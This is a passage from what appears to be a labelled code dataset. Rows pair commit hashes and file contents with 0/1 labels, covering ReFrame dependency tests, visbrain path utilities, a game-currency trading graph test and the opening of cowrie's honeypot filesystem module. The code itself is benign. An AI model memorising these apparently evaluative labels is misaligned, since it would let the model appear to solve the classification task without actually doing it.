                        self.pname == other.partition.fullname and
                        self.ename == other.environ.name)

            return NotImplemented

        def __hash__(self):
            return hash(self.cname) ^ hash(self.pname) ^ hash(self.ename)

        def __repr__(self):
            return 'Node(%r, %r, %r)' % (self.cname, self.pname, self.ename)

    def has_edge(graph, src, dst):
        return dst in graph[src]

    def num_deps(graph, cname):
        return sum(len(deps) for c, deps in graph.items()
                   if c.check.name == cname)

    def find_check(name, checks):
        for c in checks:
            if c.name == name:
                return c

        return None

    def find_case(cname, ename, cases):
        for c in cases:
            if c.check.name == cname and c.environ.name == ename:
                return c

    def setUp(self):
        self.loader = RegressionCheckLoader([
            'unittests/resources/checks_unlisted/dependencies/normal.py'
        ])

        # Set runtime prefix
        rt.runtime().resources.prefix = tempfile.mkdtemp(dir='unittests')

    def tearDown(self):
        os_ext.rmtree(rt.runtime().resources.prefix)

    @rt.switch_runtime(fixtures.TEST_SITE_CONFIG, 'sys0')
    def test_eq_hash(self):
        find_case = TestDependencies.find_case
        cases = executors.generate_testcases(self.loader.load_all())

        case0 = find_case('Test0', 'e0', cases)
        case1 = find_case('Test0', 'e1', cases)
        case0_copy = case0.clone()

        assert case0 == case0_copy
        assert hash(case0) == hash(case0_copy)
        assert case1 != case0
        assert hash(case1) != hash(case0)

    @rt.switch_runtime(fixtures.TEST_SITE_CONFIG, 'sys0')
    def test_build_deps(self):
        Node = TestDependencies.Node
        has_edge = TestDependencies.has_edge
        num_deps = TestDependencies.num_deps
        find_check = TestDependencies.find_check
        find_case = TestDependencies.find_case

        checks = self.loader.load_all()
        cases = executors.generate_testcases(checks)

        # Test calling getdep() before having built the graph
        t = find_check('Test1_exact', checks)
        with pytest.raises(DependencyError):
            t.getdep('Test0', 'e0')

        # Build dependencies and continue testing
        deps = dependency.build_deps(cases)
        dependency.validate_deps(deps)

        # Check DEPEND_FULLY dependencies
        assert num_deps(deps, 'Test1_fully') == 8
        for p in ['sys0:p0', 'sys0:p1']:
            for e0 in ['e0', 'e1']:
                for e1 in ['e0', 'e1']:
                    assert has_edge(deps,
                                    Node('Test1_fully', p, e0),
                                    Node('Test0', p, e1))

        # Check DEPEND_BY_ENV
        assert num_deps(deps, 'Test1_by_env') == 4
        assert num_deps(deps, 'Test1_default') == 4
        for p in ['sys0:p0', 'sys0:p1']:
            for e in ['e0', 'e1']:
                assert has_edge(deps,
                                Node('Test1_by_env', p, e),
                                Node('Test0', p, e))
                assert has_edge(deps,
                                Node('Test1_default', p, e),
                                Node('Test0', p, e))

        # Check DEPEND_EXACT
        assert num_deps(deps, 'Test1_exact') == 6
        for p in ['sys0:p0', 'sys0:p1']:
            assert has_edge(deps,
                            Node('Test1_exact', p, 'e0'),
                            Node('Test0', p, 'e0'))
            assert has_edge(deps,
                            Node('Test1_exact', p, 'e0'),
                            Node('Test0', p, 'e1'))
            assert has_edge(deps,
                            Node('Test1_exact', p, 'e1'),
                            Node('Test0', p, 'e1'))

        # Pick a check to test getdep()
        check_e0 = find_case('Test1_exact', 'e0', cases).check
        check_e1 = find_case('Test1_exact', 'e1', cases).check
        assert check_e0.getdep('Test0', 'e0').name == 'Test0'
        assert check_e0.getdep('Test0', 'e1').name == 'Test0'
        assert check_e1.getdep('Test0', 'e1').name == 'Test0'
        with pytest.raises(DependencyError):
            check_e0.getdep('TestX', 'e0')

        with pytest.raises(DependencyError):
            check_e0.getdep('Test0', 'eX')

        with pytest.raises(DependencyError):
            check_e1.getdep('Test0', 'e0')

    @rt.switch_runtime(fixtures.TEST_SITE_CONFIG, 'sys0')
    def test_build_deps_unknown_test(self):
        find_check = TestDependencies.find_check
        checks = self.loader.load_all()

        # Add some inexistent dependencies
        test0 = find_check('Test0', checks)
        for depkind in ('default', 'fully', 'by_env', 'exact'):
            test1 = find_check('Test1_' + depkind, checks)
            if depkind == 'default':
                test1.depends_on('TestX')
            elif depkind == 'exact':
                test1.depends_on('TestX', rfm.DEPEND_EXACT, {'e0': ['e0']})
            elif depkind == 'fully':
                test1.depends_on('TestX', rfm.DEPEND_FULLY)
            elif depkind == 'by_env':
                test1.depends_on('TestX', rfm.DEPEND_BY_ENV)

            with pytest.raises(DependencyError):
                dependency.build_deps(executors.generate_testcases(checks))

    @rt.switch_runtime(fixtures.TEST_SITE_CONFIG, 'sys0')
    def test_build_deps_unknown_target_env(self):
        find_check = TestDependencies.find_check
        checks = self.loader.load_all()

        # Add some inexistent dependencies
        test0 = find_check('Test0', checks)
        test1 = find_check('Test1_default', checks)
        test1.depends_on('Test0', rfm.DEPEND_EXACT, {'e0': ['eX']})
        with pytest.raises(DependencyError):
            dependency.build_deps(executors.generate_testcases(checks))

    @rt.switch_runtime(fixtures.TEST_SITE_CONFIG, 'sys0')
    def test_build_deps_unknown_source_env(self):
        find_check = TestDependencies.find_check
        num_deps = TestDependencies.num_deps
        checks = self.loader.load_all()

        # Add some inexistent dependencies
        test0 = find_check('Test0', checks)
        test1 = find_check('Test1_default', checks)
        test1.depends_on('Test0', rfm.DEPEND_EXACT, {'eX': ['e0']})

        # Unknown source is ignored, because it might simply be that the test
        # is not executed for eX
        deps = dependency.build_deps(executors.generate_testcases(checks))
        assert num_deps(deps, 'Test1_default') == 4

    def create_test(self, name):
        test = rfm.RegressionTest()
        test.name = name
        test.valid_systems = ['*']
        test.valid_prog_environs = ['*']
        test.executable = 'echo'
        test.executable_opts = [name]
        return test

    @rt.switch_runtime(fixtures.TEST_SITE_CONFIG, 'sys0')
    def test_valid_deps(self):
        #
        #       t0
        #       ^
        #       |
        #   +-->t1<--+
        #   |        |
        #   t2<------t3
        #   ^        ^
        #   |        |
        #   +---t4---+
        #
        t0 = self.create_test('t0')
        t1 = self.create_test('t1')
        t2 = self.create_test('t2')
        t3 = self.create_test('t3')
        t4 = self.create_test('t4')
        t1.depends_on('t0')
        t2.depends_on('t1')
        t3.depends_on('t1')
        t3.depends_on('t2')
        t4.depends_on('t2')
        t4.depends_on('t3')
        dependency.validate_deps(
            dependency.build_deps(
                executors.generate_testcases([t0, t1, t2, t3, t4])
            )
        )

    @rt.switch_runtime(fixtures.TEST_SITE_CONFIG, 'sys0')
    def test_cyclic_deps(self):
        #
        #       t0
        #       ^
        #       |
        #   +-->t1<--+
        #   |   |    |
        #   t2  |    t3
        #   ^   |    ^
        #   |   v    |
        #   +---t4---+
        #
        t0 = self.create_test('t0')
        t1 = self.create_test('t1')
        t2 = self.create_test('t2')
        t3 = self.create_test('t3')
        t4 = self.create_test('t4')
        t1.depends_on('t0')
        t1.depends_on('t4')
        t2.depends_on('t1')
        t3.depends_on('t1')
        t3.depends_on('t2')
        t4.depends_on('t2')
        t4.depends_on('t3')
        deps = dependency.build_deps(
            executors.generate_testcases([t0, t1, t2, t3, t4])
        )

        with pytest.raises(DependencyError) as exc_info:
            dependency.validate_deps(deps)

        assert ('t4->t2->t1->t4' in str(exc_info.value) or
                't2->t1->t4->t2' in str(exc_info.value) or
                't1->t4->t2->t1' in str(exc_info.value) or
                't1->t4->t3->t1' in str(exc_info.value) or
                't4->t3->t1->t4' in str(exc_info.value) or
                't3->t1->t4->t3' in str(exc_info.value))

    @rt.switch_runtime(fixtures.TEST_SITE_CONFIG, 'sys0')
    def test_cyclic_deps_by_env(self):
        t0 = self.create_test('t0')
        t1 = self.create_test('t1')
        t1.depends_on('t0', rfm.DEPEND_EXACT, {'e0': ['e0']})
        t0.depends_on('t1', rfm.DEPEND_EXACT, {'e1': ['e1']})
        deps = dependency.build_deps(
            executors.generate_testcases([t0, t1])
        )
        with pytest.raises(DependencyError) as exc_info:
            dependency.validate_deps(deps)

        assert ('t1->t0->t1' in str(exc_info.value) or
                't0->t1->t0' in str(exc_info.value))
/n/n/n",1
86,a44d94de5005ff28306d5c565e67b6b046019e89,"visbrain/io/path.py/n/n""""""Set of functions for path definitions.""""""
import logging
import os
import sys
import pkg_resources

logger = logging.getLogger('visbrain')


__all__ = ['path_to_visbrain_data', 'get_files_in_folders', 'path_to_tmp',
           'clean_tmp', 'get_data_url_path']


def path_to_visbrain_data(file=None, folder=None):
    """"""Get the path to the visbrain_data folder.

    Parameters
    ----------
    folder : string | None
        Folder name.
    file : string | None
        File name. If None, only the path to the visbrain_data folder is
        returned.

    Returns
    -------
    path : string
        Path to the file or to the visbrain_data.
    """"""
    vb_path = os.path.join(os.path.expanduser('~'), 'visbrain_data')
    folder = '' if not isinstance(folder, str) else folder
    vb_path = os.path.join(vb_path, folder)
    if not os.path.exists(vb_path):
        os.makedirs(vb_path)
        logger.info(""visbrain_data has been added to %s"" % vb_path)
    file = '' if not isinstance(file, str) else file
    return os.path.join(vb_path, file)

def get_data_url_path():
    """"""Get the path to the data_url JSON file.""""""
    data_url_filepath = pkg_resources.resource_filename('visbrain','data_url.json')
    return data_url_filepath


def get_files_in_folders(*args, with_ext=False, with_path=False, file=None,
                         exclude=None, sort=True, unique=True):
    """"""Get all files in several folders.

    Parameters
    ----------
    args : string
        Path to folders.
    with_ext : bool | False
        Specify if returned files should contains extensions.
    with_path : bool | False
        Specify if returned files should contains full path to it.
    file : string | None
        Specify if a specific file name is needed.
    exclude : list | None
        List of patterns to exclude
    sort : bool | True
        Sort the resulting list of files.
    unique : bool | True
        Get a unique list of files.

    Returns
    -------
    files : list
        List of files in selected folders if no file is provided. If file is a
        string, return the path to it, None if the file doesn't exist.
    """"""
    # Search the file :
    files = []
    if isinstance(file, str):
        import glob
        for k in args:
            if os.path.exists(k):
                files += glob.glob(os.path.join(k, file))
        return files
    # Get the list of files :
    for k in args:
        if os.path.exists(k):
            if with_path:
                files += [os.path.join(k, i) for i in os.listdir(k)]
            else:
                files += os.listdir(k)
    # Keep only a selected file :
    if isinstance(file, str) and (file in files):
        files = [files[files.index(file)]]
    # Return either files with full path or only file name :
    if not with_ext:
        files = [os.path.splitext(k)[0] for k in files]
    # Patterns to exclude :
    if isinstance(exclude, (list, tuple)):
        from itertools import product
        files = [k for k, i in product(files, exclude) if i not in k]
    # Unique :
    if unique:
        files = list(set(files))
    # Sort list :
    if sort:
        files.sort()
    return files


def path_to_tmp(file=None, folder=None):
    """"""Get the path to the tmp folder.""""""
    tmp_path = os.path.join(path_to_visbrain_data(), 'tmp')
    if not os.path.exists(tmp_path):
        os.mkdir(tmp_path)
    folder = '' if not isinstance(folder, str) else folder
    file = '' if not isinstance(file, str) else file
    tmp_path = os.path.join(tmp_path, folder)
    if not os.path.exists(tmp_path):
        os.mkdir(tmp_path)
    return os.path.join(tmp_path, file)


def clean_tmp():
    """"""Clean the tmp folder.""""""
    tmp_path = os.path.join(path_to_visbrain_data(), 'tmp')
    if os.path.exists(tmp_path):
        import shutil
        shutil.rmtree(tmp_path)
/n/n/n",0
87,a44d94de5005ff28306d5c565e67b6b046019e89,"/visbrain/io/path.py/n/n""""""Set of functions for path definitions.""""""
import logging
import os
import sys

logger = logging.getLogger('visbrain')


__all__ = ['path_to_visbrain_data', 'get_files_in_folders', 'path_to_tmp',
           'clean_tmp', 'get_data_url_path']


def path_to_visbrain_data(file=None, folder=None):
    """"""Get the path to the visbrain_data folder.

    Parameters
    ----------
    folder : string | None
        Folder name.
    file : string | None
        File name. If None, only the path to the visbrain_data folder is
        returned.

    Returns
    -------
    path : string
        Path to the file or to the visbrain_data.
    """"""
    vb_path = os.path.join(os.path.expanduser('~'), 'visbrain_data')
    folder = '' if not isinstance(folder, str) else folder
    vb_path = os.path.join(vb_path, folder)
    if not os.path.exists(vb_path):
        os.makedirs(vb_path)
        logger.info(""visbrain_data has been added to %s"" % vb_path)
    file = '' if not isinstance(file, str) else file
    return os.path.join(vb_path, file)


def get_data_url_path():
    """"""Get the path to the data_url JSON file.""""""
    path_file = str(sys.modules[__name__].__file__)
    url_path = os.path.dirname(os.path.dirname(path_file))
    return os.path.join(url_path, 'data_url.json')


def get_files_in_folders(*args, with_ext=False, with_path=False, file=None,
                         exclude=None, sort=True, unique=True):
    """"""Get all files in several folders.

    Parameters
    ----------
    args : string
        Path to folders.
    with_ext : bool | False
        Specify if returned files should contains extensions.
    with_path : bool | False
        Specify if returned files should contains full path to it.
    file : string | None
        Specify if a specific file name is needed.
    exclude : list | None
        List of patterns to exclude
    sort : bool | True
        Sort the resulting list of files.
    unique : bool | True
        Get a unique list of files.

    Returns
    -------
    files : list
        List of files in selected folders if no file is provided. If file is a
        string, return the path to it, None if the file doesn't exist.
    """"""
    # Search the file :
    files = []
    if isinstance(file, str):
        import glob
        for k in args:
            if os.path.exists(k):
                files += glob.glob(os.path.join(k, file))
        return files
    # Get the list of files :
    for k in args:
        if os.path.exists(k):
            if with_path:
                files += [os.path.join(k, i) for i in os.listdir(k)]
            else:
                files += os.listdir(k)
    # Keep only a selected file :
    if isinstance(file, str) and (file in files):
        files = [files[files.index(file)]]
    # Return either files with full path or only file name :
    if not with_ext:
        files = [os.path.splitext(k)[0] for k in files]
    # Patterns to exclude :
    if isinstance(exclude, (list, tuple)):
        from itertools import product
        files = [k for k, i in product(files, exclude) if i not in k]
    # Unique :
    if unique:
        files = list(set(files))
    # Sort list :
    if sort:
        files.sort()
    return files


def path_to_tmp(file=None, folder=None):
    """"""Get the path to the tmp folder.""""""
    tmp_path = os.path.join(path_to_visbrain_data(), 'tmp')
    if not os.path.exists(tmp_path):
        os.mkdir(tmp_path)
    folder = '' if not isinstance(folder, str) else folder
    file = '' if not isinstance(file, str) else file
    tmp_path = os.path.join(tmp_path, folder)
    if not os.path.exists(tmp_path):
        os.mkdir(tmp_path)
    return os.path.join(tmp_path, file)


def clean_tmp():
    """"""Clean the tmp folder.""""""
    tmp_path = os.path.join(path_to_visbrain_data(), 'tmp')
    if os.path.exists(tmp_path):
        import shutil
        shutil.rmtree(tmp_path)
/n/n/n",1
88,b0214dec06089bd9f45b028f3b69ed5dc29df204,"tests/graph_test.py/n/nimport unittest
from src.graph import *


test_offers = [{
  'offers': [
    {'contact_ign': 'KnifeySpooneyClaw', 'conversion_rate': 0.0893, 'stock': 153}
  ],
  'want': 'Chaos',
  'have': 'Alteration',
  'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 10},
    {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 20}
  ],
  'want': 'Chaos',
  'have': 'Chromatic',
  'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 24},
    {'contact_ign': 'Corailthedog', 'conversion_rate': 11.0, 'stock': 2}
  ],
  'want': 'Alteration',
  'have': 'Chaos',
  'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': 'Azure_Dragon', 'conversion_rate': 1.0101, 'stock': 4261},
    {'contact_ign': 'Marcvz_GreenAgain', 'conversion_rate': 0.7143, 'stock': 222}
  ],
    'want': 'Alteration',
    'have': 'Chromatic',
    'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': 'The_Dank_Fire_God', 'conversion_rate': 11.5, 'stock': 106},
    {'contact_ign': 'MinerinoAbysss', 'conversion_rate': 11.1, 'stock': 322}
  ],
  'want': 'Chromatic',
  'have': 'Chaos',
  'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449},
    {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576}
  ],
  'want': 'Chromatic',
  'have': 'Alteration',
  'league': 'Abyss'
}]

expected_graph = {
  'Chaos': {
    'Alteration': [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 24},
      {'contact_ign': 'Corailthedog', 'conversion_rate': 11.0, 'stock': 2}
    ],
    'Chromatic': [
      {'contact_ign': 'The_Dank_Fire_God', 'conversion_rate': 11.5, 'stock': 106},
      {'contact_ign': 'MinerinoAbysss', 'conversion_rate': 11.1, 'stock': 322}
    ]
  },
  'Alteration': {
    'Chaos': [
      {'contact_ign': 'KnifeySpooneyClaw', 'conversion_rate': 0.0893, 'stock': 153}
    ],
    'Chromatic': [
      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449},
      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576}
    ]
  },
  'Chromatic': {
    'Chaos': [
      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 10},
      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 20}
    ],
    'Alteration': [
      {'contact_ign': 'Azure_Dragon', 'conversion_rate': 1.0101, 'stock': 4261},
      {'contact_ign': 'Marcvz_GreenAgain', 'conversion_rate': 0.7143, 'stock': 222}
    ]
  }
}



### Below structures are modified for simpler testing => number reduced, offers slightly changed


# Exptected graph when trading from Chaos to Chaos over one other currency
expected_graph_small = {
  'Chaos': {
    'Alteration': [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100}
    ]
  },
  'Alteration': {
    'Chromatic': [
      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449},
      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576}
    ]
  },
  'Chromatic': {
    'Chaos': [
      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 100},
      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 200}
    ]
  }
}

# Expected paths from Chaos to Chaos
def expected_paths_small_same_currency():
  return [
    [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576, 'have': 'Alteration', 'want': 'Chromatic'},
      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 200, 'have': 'Chromatic', 'want': 'Chaos'}
    ], [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576, 'have': 'Alteration', 'want': 'Chromatic'},
      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 100, 'have': 'Chromatic', 'want': 'Chaos'}
    ], [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449, 'have': 'Alteration', 'want': 'Chromatic'},
      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 200, 'have': 'Chromatic', 'want': 'Chaos'}
    ], [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449, 'have': 'Alteration', 'want': 'Chromatic'},
      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 100, 'have': 'Chromatic', 'want': 'Chaos'}
    ]
  ]

def expected_profitable_paths_small_same_currency():
  return []


# Expected paths from Chaos to Chromatics
# This is not really relevant to us, since we only care about trade paths between the same currency in order to
# guarantee easily comparable results. However, it's good to make sure that the path exploration also works for this
# edge case
expected_profitable_paths_small_different_currency = [
  [
    {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
    {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576, 'have': 'Alteration', 'want': 'Chromatic'}
  ], [
    {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
    {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449, 'have': 'Alteration', 'want': 'Chromatic'}
  ]
]


expected_conversion = {
  ""from"": ""Chaos"",
  ""to"": ""Chaos"",
  ""starting"": 8,
  ""ending"": 5,
  ""winnings"": -3,
  ""transactions"": [{
    ""contact_ign"": ""wreddnuy"",
    ""from"": ""Chaos"",
    ""to"": ""Alteration"",
    ""paid"": 8,
    ""received"": 96,
    ""conversion_rate"": 12.0
  }, {
    ""contact_ign"": ""Shioua_ouah"",
    ""from"": ""Alteration"",
    ""to"": ""Chromatic"",
    ""paid"": 96,
    ""received"": 66,
    ""conversion_rate"": 0.6897
  }, {
    ""contact_ign"": ""MVP_Kefir"",
    ""from"": ""Chromatic"",
    ""to"": ""Chaos"",
    ""paid"": 66,
    ""received"": 5,
    ""conversion_rate"": 0.087
  }]
}


class GraphTest(unittest.TestCase):
  def test_build_graph(self):
    graph = build_graph(test_offers)
    self.assertDictEqual(graph, expected_graph)

  def test_find_paths(self):
    paths_small_same_currency = find_paths(expected_graph_small, 'Chaos', 'Chaos')
    self.assertListEqual(expected_profitable_paths_small_same_currency(), paths_small_same_currency)
    paths_small_different_currency = find_paths(expected_graph_small.copy(), 'Chaos', 'Chromatic')
    self.assertListEqual(expected_profitable_paths_small_different_currency, paths_small_different_currency)

  def test_is_profitable(self):
    path = expected_paths_small_same_currency()[0]
    self.assertEqual(False, is_profitable(path))

  def test_build_conversions(self):
    path = expected_paths_small_same_currency()[0]
    conversion = build_conversion(path)
    print(conversion)
    self.assertDictEqual(expected_conversion, conversion)

  def test_stock_equalization(self):
    pass
/n/n/n",0
89,b0214dec06089bd9f45b028f3b69ed5dc29df204,"/tests/graph_test.py/n/nimport unittest
from src.graph import *


test_offers = [{
  'offers': [
    {'contact_ign': 'KnifeySpooneyClaw', 'conversion_rate': 0.0893, 'stock': 153}
  ],
  'want': 'Chaos',
  'have': 'Alteration',
  'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 10},
    {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 20}
  ],
  'want': 'Chaos',
  'have': 'Chromatic',
  'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 24},
    {'contact_ign': 'Corailthedog', 'conversion_rate': 11.0, 'stock': 2}
  ],
  'want': 'Alteration',
  'have': 'Chaos',
  'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': 'Azure_Dragon', 'conversion_rate': 1.0101, 'stock': 4261},
    {'contact_ign': 'Marcvz_GreenAgain', 'conversion_rate': 0.7143, 'stock': 222}
  ],
    'want': 'Alteration',
    'have': 'Chromatic',
    'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': 'The_Dank_Fire_God', 'conversion_rate': 11.5, 'stock': 106},
    {'contact_ign': 'MinerinoAbysss', 'conversion_rate': 11.1, 'stock': 322}
  ],
  'want': 'Chromatic',
  'have': 'Chaos',
  'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449},
    {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576}
  ],
  'want': 'Chromatic',
  'have': 'Alteration',
  'league': 'Abyss'
}]

expected_graph = {
  'Chaos': {
    'Alteration': [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 24},
      {'contact_ign': 'Corailthedog', 'conversion_rate': 11.0, 'stock': 2}
    ],
    'Chromatic': [
      {'contact_ign': 'The_Dank_Fire_God', 'conversion_rate': 11.5, 'stock': 106},
      {'contact_ign': 'MinerinoAbysss', 'conversion_rate': 11.1, 'stock': 322}
    ]
  },
  'Alteration': {
    'Chaos': [
      {'contact_ign': 'KnifeySpooneyClaw', 'conversion_rate': 0.0893, 'stock': 153}
    ],
    'Chromatic': [
      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449},
      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576}
    ]
  },
  'Chromatic': {
    'Chaos': [
      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 10},
      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 20}
    ],
    'Alteration': [
      {'contact_ign': 'Azure_Dragon', 'conversion_rate': 1.0101, 'stock': 4261},
      {'contact_ign': 'Marcvz_GreenAgain', 'conversion_rate': 0.7143, 'stock': 222}
    ]
  }
}



### Below structures are modified for simpler testing => number reduced, offers slightly changed


# Exptected graph when trading from Chaos to Chaos over one other currency
expected_graph_small = {
  'Chaos': {
    'Alteration': [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100}
    ]
  },
  'Alteration': {
    'Chromatic': [
      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449},
      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576}
    ]
  },
  'Chromatic': {
    'Chaos': [
      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 100},
      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 200}
    ]
  }
}

# Expected paths from Chaos to Chaos
def expected_paths_small_same_currency():
  return [
    [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576, 'have': 'Alteration', 'want': 'Chromatic'},
      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 200, 'have': 'Chromatic', 'want': 'Chaos'}
    ], [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576, 'have': 'Alteration', 'want': 'Chromatic'},
      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 100, 'have': 'Chromatic', 'want': 'Chaos'}
    ], [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449, 'have': 'Alteration', 'want': 'Chromatic'},
      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 200, 'have': 'Chromatic', 'want': 'Chaos'}
    ], [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449, 'have': 'Alteration', 'want': 'Chromatic'},
      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 100, 'have': 'Chromatic', 'want': 'Chaos'}
    ]
  ]


# Expected paths from Chaos to Chromatics
# This is not really relevant to us, since we only care about trade paths between the same currency in order to
# guarantee easily comparable results. However, it's good to make sure that the path exploration also works for this
# edge case
expected_paths_small_different_currency = [
  [
    {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
    {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576, 'have': 'Alteration', 'want': 'Chromatic'}
  ], [
    {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
    {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449, 'have': 'Alteration', 'want': 'Chromatic'}
  ]
]


expected_conversion = {
  ""from"": ""Chaos"",
  ""to"": ""Chaos"",
  ""starting"": 8,
  ""ending"": 5,
  ""winnings"": -3,
  ""transactions"": [{
    ""contact_ign"": ""wreddnuy"",
    ""from"": ""Chaos"",
    ""to"": ""Alteration"",
    ""paid"": 8,
    ""received"": 96
  }, {
    ""contact_ign"": ""Shioua_ouah"",
    ""from"": ""Alteration"",
    ""to"": ""Chromatic"",
    ""paid"": 96,
    ""received"": 66
  }, {
    ""contact_ign"": ""MVP_Kefir"",
    ""from"": ""Chromatic"",
    ""to"": ""Chaos"",
    ""paid"": 66,
    ""received"": 5
  }]
}


class GraphTest(unittest.TestCase):
  def test_build_graph(self):
    graph = build_graph(test_offers)
    self.assertDictEqual(graph, expected_graph)

  def test_find_paths(self):
    paths_small_same_currency = find_paths(expected_graph_small, 'Chaos', 'Chaos')
    self.assertListEqual(expected_paths_small_same_currency(), paths_small_same_currency)
    paths_small_different_currency = find_paths(expected_graph_small.copy(), 'Chaos', 'Chromatic')
    self.assertListEqual(expected_paths_small_different_currency, paths_small_different_currency)

  def test_is_profitable(self):
    path = expected_paths_small_same_currency()[0]
    self.assertEqual(False, is_profitable(path))

  def test_build_conversions(self):
    path = expected_paths_small_same_currency()[0]
    conversion = build_conversion(path)
    print(conversion)
    self.assertDictEqual(expected_conversion, conversion)
/n/n/n",1
90,cb2c5d4f654cc4709c3edc97ec7216c210901c78,"cowrie/shell/fs.py/n/n# Copyright (c) 2009-2014 Upi Tamminen <desaster@gmail.com>
# See the COPYRIGHT file for more information

""""""
This module contains ...
""""""

from __future__ import division, absolute_import

try:
    import cPickle as pickle
except:
    import pickle

import os
import time
import fnmatch
import hashlib
import re
import stat
import errno

from twisted.python import log

from cowrie.core.config import CONFIG

PICKLE = pickle.load(open(CONFIG.get('honeypot', 'filesystem_file'), 'rb'))

A_NAME, \
    A_TYPE, \
    A_UID, \
    A_GID, \
    A_SIZE, \
    A_MODE, \
    A_CTIME, \
    A_CONTENTS, \
    A_TARGET, \
    A_REALFILE = list(range(0, 10))
T_LINK, \
    T_DIR, \
    T_FILE, \
    T_BLK, \
    T_CHR, \
    T_SOCK, \
    T_FIFO = list(range(0, 7))

class TooManyLevels(Exception):
    """"""
    62 ELOOP Too many levels of symbolic links.  A path name lookup involved more than 8 symbolic links.
